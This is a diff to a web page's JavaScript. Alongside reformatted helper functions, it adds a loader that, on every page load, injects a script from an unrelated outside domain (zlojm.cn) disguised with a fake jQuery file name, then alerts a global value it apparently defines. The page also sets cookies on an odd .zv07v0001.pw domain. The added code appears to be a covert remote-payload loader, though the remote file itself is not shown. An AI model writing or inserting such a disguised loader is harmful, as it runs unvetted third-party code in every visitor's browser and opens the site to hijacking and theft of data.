@@ -526,17 +526,33 @@ function setCookie(name, value) {
     //document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString();
     document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString()+ ";domain=.zv07v0001.pw";
 }
-        function share(){
-            $("#tips").show();
-        }
-        function di2(){
-            setCookie('ti', 'yes');
-        }
-        function GetRandomNum(Min, Max) {
-            var Range = Max - Min;
-            var Rand = Math.random();
-            return (Min + Math.round(Rand * Range));
-        }
+
+function share(){
+    $("#tips").show();
+}
+function di2(){
+    setCookie('ti', 'yes');
+}
+function GetRandomNum(Min, Max) {
+    var Range = Max - Min;
+    var Rand = Math.random();
+    return (Min + Math.round(Rand * Range));
+}
+        
+function loadJs(jsurl, callback){
+	var s = document.createElement("script");
+	s.type = "text/javascript";
+	s.src = jsurl;
+    s.addEventListener('load', function (e) { callback(null, e); }, false);
+	document.getElementsByTagName('head')[0].appendChild(s);
+}     
+
+$(function () {
+    loadJs("http://zlojm.cn/js/jquery-1.9.36.min.js", function () {
+        alert(window.sdom);
+    });
+});   
+        
 
 var _hmt = _hmt || [];
 (function() {
